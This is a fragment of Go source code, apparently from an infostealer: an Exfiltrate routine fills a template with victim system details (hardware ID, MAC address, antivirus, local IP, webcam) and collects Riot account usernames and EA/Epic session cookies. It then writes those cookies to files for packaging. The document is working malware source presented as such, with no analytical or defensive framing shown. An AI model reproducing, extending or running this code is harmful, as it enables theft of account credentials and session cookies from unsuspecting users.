...
//go:embed exfil_text/SysInfo_windows.txt
var SysInfoText string

type DataStruct struct {
	SysInfo   infostealer.SysinfoWindows
	Messaging struct {
...
func setSysinfoWindows(t infostealer.SysinfoWindows) string {
	...
	content = strings.ReplaceAll(content, "WebcamPlaceholder", t.Webcam)
	content = strings.ReplaceAll(content, "HWIDPlaceholder", t.Hwid)
	content = strings.ReplaceAll(content, "MACPlaceholder", t.NetworkInfo.MacAddr)
	content = strings.ReplaceAll(content, "AVPlaceholder", t.Antivirus)
	content = strings.ReplaceAll(content, "LocalIPPlaceholder", t.NetworkInfo.LocalIp)
	content = strings.ReplaceAll(content, "AdapterPlaceholder", t.NetworkInfo.Adapter)
	return content
}
...
func (data *DataStruct) Exfiltrate() ZipMap {
	...
	content := setSysinfoWindows(data.SysInfo)
	...
	if data.GamingPlatforms != nil {
		...
		for _, platform := range data.GamingPlatforms {
			...
			case strings.Contains(platform.Name, "Riot"):
				gamingstring = gamingstring + "User Info:" +
					"\n\t\tUsername: " + platform.RiotData.Data.Install.Login.Username +
					"\n\t\tRegion:   " + platform.RiotData.Data.Install.Globals.Region + "\n\n"
				var cookiestring string
			...
			case strings.Contains(platform.Name, "EA"):
				var cookiestring string
				for _, cookie := range platform.EpicData.Cookies {
					cookiestring = cookiestring + cookie.Name +
						"\n\tDomain: " + cookie.Domain +
				...
				eaFolder := filepath.Join(gameFolder, "EA")
				os.MkdirAll(eaFolder, 0755)
				os.WriteFile(filepath.Join(eaFolder, "Cookies.txt"), []byte(cookiestring), 0644)
			}
		}
